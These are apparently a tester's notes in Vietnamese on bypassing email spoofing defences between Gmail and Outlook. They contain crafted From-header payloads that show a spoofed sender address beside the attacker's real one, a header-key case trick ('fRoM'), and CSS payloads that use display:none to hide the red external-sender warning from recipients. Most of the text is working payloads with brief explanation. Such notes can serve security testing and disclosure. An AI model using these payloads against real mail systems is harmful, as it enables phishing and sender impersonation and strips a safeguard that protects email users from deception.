**I, Bypass payload chứa “:“**
- Luồng từ Gmail đến outlook
- Payload
    
```
"\"Hoang Tuyen Quyen\" <at180341@actvn.edu.vn>:<qh6967258@gmail.com>"
": <at180341@actvn.edu.vn> <qh6967258@gmail.com>"
```
    
- Form = String + <email spoofing> + Inject String + <real email>
- String và inject String có thể là bất cứ thứ gì như kí tự, khoảng trắng, chữ ,số, … nhưng bắt buộc phải có
- email spoofing có thể bất kỳ email nào (kể cả email không tồn tại)
- real email bắt buộc phải là email gốc của attacker gửi
    
—> Hoàn toàn bypass được bằng cách thay : trong payload gốc thành bất cứ kí tự gì 
    
- String, Khoảng trắng, kí tự khác, …

**II, Bypass upper case**
message["from"] = message["From"] = message["FROM"] = message["fRoM"]

- Key chỉ cần là from không quan trọng upper hay lower key

**III, Bypass CSS cảnh báo**
- Hệ thống sẽ có dòng cảnh báo đỏ với email gửi từ ngoài vào. Vậy nên cần gửi kèm css để che được dòng cảnh báo đó
- Payload gốc:

```
<style type="text/css">
		.id3 {
			display: block !important;
		}
...
	</style>
```

- Với Display none để ẩn mã thông báo và !important để thể hiện mức độ ưu tiên → ghi đè CSS cảnh báo
- Thêm cách khác bằng cách bỏ sự ưu tiên đi vẫn được → xóa bỏ !important

```
<style type="text/css">
        body .email-content .id3 {
            display: block;
        }
        body .email-content div[style] {
            display: none;
            background: #FFFFFF;
...
    </style>
```